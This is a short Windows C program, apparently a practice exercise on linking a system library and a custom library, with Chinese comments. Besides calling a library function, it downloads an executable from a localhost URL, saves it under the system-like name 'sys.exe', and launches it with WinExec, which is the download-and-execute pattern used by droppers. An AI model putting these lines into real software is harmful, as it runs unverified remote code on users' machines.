#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<urlmon.h>

//选择自定义库，全路径，源文件目录

#pragma comment(lib,"Urlmon.lib")				//链接系统库
#pragma comment(lib,"runtest.lib")				//链接自定义库

int main(){
	printf("%d", add(1, 2));
	URLDownloadToFileA(NULL, "http://127.0.0.1/huahua.exe", "G:\\sys.exe", 0, NULL);
	WinExec("G:\\sys.exe", SW_SHOW);			//启动应用程序							

	getchar();
	return 0;
}